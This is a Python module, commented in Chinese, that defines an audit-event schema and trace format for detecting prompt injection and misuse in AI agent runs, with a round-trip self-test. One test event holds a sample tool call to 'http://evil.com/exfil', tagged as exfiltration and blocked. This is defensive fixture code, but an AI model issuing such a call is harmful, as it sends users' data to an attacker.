#!/usr/bin/env python3
"""
audit_schema.py · AI Agent 运行时审计事件结构(赛题#4 的"可审计证据链"基础)

把 Agent 每一步(LLM调用/工具调用/返回/执行)结构化成统一审计事件,串成一次任务的 trace。
检测器在这条事件流上做提示注入/越权/异常链路检测;命中时记录 证据(触发的提示词上下文、
工具名、参数、函数栈),对应官方评分②"关键证据定位能力(可解释可审计)"。

纯标准库,`python audit_schema.py` 跑 round-trip 自测。
"""
import json
from dataclasses import dataclass, field, asdict
from typing import List, Optional

EVENT_TYPES = ("llm_call", "tool_call", "tool_return", "exec")
DECISIONS = ("allow", "block", "alert")


@dataclass
class AuditEvent:
    trace_id: str
    step_id: int
    ts: float                                  # 相对时间戳(秒);脚本里由调用方传入,不用系统时钟
    type: str                                  # EVENT_TYPES 之一
    prompt_ctx: str = ""                       # 该步相关的提示词上下文
    tool_name: str = ""
    tool_args: dict = field(default_factory=dict)
    tool_return: str = ""
    stack_frames: List[str] = field(default_factory=list)
    risk_tags: List[str] = field(default_factory=list)   # 检测器打的风险标签
    decision: str = "allow"                    # DECISIONS 之一
    evidence: Optional[str] = None             # 关键证据(命中片段/定位)

    def __post_init__(self):
        if self.type not in EVENT_TYPES:
            raise ValueError(f"非法事件类型 {self.type},应为 {EVENT_TYPES}")
        if self.decision not in DECISIONS:
            raise ValueError(f"非法 decision {self.decision}")


@dataclass
class Trace:
    trace_id: str
    events: List[AuditEvent] = field(default_factory=list)

    def add(self, ev: AuditEvent):
        self.events.append(ev)

    def to_json(self) -> str:
        return json.dumps({"trace_id": self.trace_id,
                           "events": [asdict(e) for e in self.events]},
                          ensure_ascii=False, indent=2)

    @staticmethod
    def from_json(s: str) -> "Trace":
        d = json.loads(s)
        t = Trace(d["trace_id"])
        t.events = [AuditEvent(**e) for e in d["events"]]
        return t

    def blocked(self):
        return [e for e in self.events if e.decision == "block"]

    def alerts(self):
        return [e for e in self.events if e.decision in ("block", "alert")]


def _selftest():
    import sys
    ok = True

    def check(c, m):
        nonlocal ok
        print(("  ✅ " if c else "  ❌ ") + m); ok = ok and c

    t = Trace("T1")
    t.add(AuditEvent("T1", 0, 0.0, "llm_call", prompt_ctx="用户:查询余额"))
    t.add(AuditEvent("T1", 1, 0.12, "tool_call", tool_name="db.query",
                     tool_args={"sql": "select balance"}, stack_frames=["agent.run", "tool.exec"]))
    t.add(AuditEvent("T1", 2, 0.20, "tool_call", tool_name="http.get",
                     tool_args={"url": "http://evil.com/exfil"}, risk_tags=["exfiltration"],
                     decision="block", evidence="外联到 evil.com"))

    js = t.to_json()
    t2 = Trace.from_json(js)
    check(t2.trace_id == "T1" and len(t2.events) == 3, "trace JSON round-trip 一致")
    check(t2.events[2].decision == "block" and t2.events[2].tool_name == "http.get", "事件字段保真")
    check(len(t.blocked()) == 1 and len(t.alerts()) == 1, "blocked/alerts 统计正确")

    try:
        AuditEvent("X", 0, 0.0, "bogus"); check(False, "非法事件类型应报错")
    except ValueError:
        check(True, "非法事件类型被拒")

    print("\n" + ("✅ audit_schema 自测通过" if ok else "❌ 自测未通过"))
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    _selftest()
